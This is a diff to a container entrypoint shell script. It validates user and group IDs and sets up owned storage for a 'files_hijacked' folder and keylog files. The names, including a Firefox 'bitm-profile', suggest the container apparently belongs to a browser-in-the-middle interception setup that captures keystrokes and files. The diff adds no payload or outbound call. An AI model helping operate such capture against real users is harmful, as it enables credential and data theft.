@@ -30,7 +30,26 @@ done
 
 # Selkies Config
 export DISPLAY=:1
-install -d -o abc -g abc /storage/files_hijacked
+storage_uid="${PUID:-1000}"
+storage_gid="${PGID:-1000}"
+[[ "$storage_uid" =~ ^[1-9][0-9]*$ ]] || fail_invalid_env "PUID"
+[[ "$storage_gid" =~ ^[1-9][0-9]*$ ]] || fail_invalid_env "PGID"
+
+# The LinuxServer init remaps `abc` to PUID/PGID after this entrypoint hands
+# control to s6. Prepare the bind mount with those numeric IDs now so the
+# desktop user and the UID 1000 backend can both access session artifacts.
+install -d -o "$storage_uid" -g "$storage_gid" -m 0755 /storage
+install -d -o "$storage_uid" -g "$storage_gid" -m 0755 \
+    /storage/files_hijacked
+for keylog_path in /storage/keylogs.txt /storage/keylogs.previous.txt; do
+    if [ -L "$keylog_path" ] || { [ -e "$keylog_path" ] && [ ! -f "$keylog_path" ]; }; then
+        fail_invalid_env "unsafe keylog storage path"
+    fi
+    if [ -f "$keylog_path" ]; then
+        chown "$storage_uid:$storage_gid" "$keylog_path"
+        chmod 0644 "$keylog_path"
+    fi
+done
 
 if [ "$THEME" == "light" ]; then
     sed -i "s|THEME|0|g" /config/.mozilla/firefox/bitm-profile/user.js
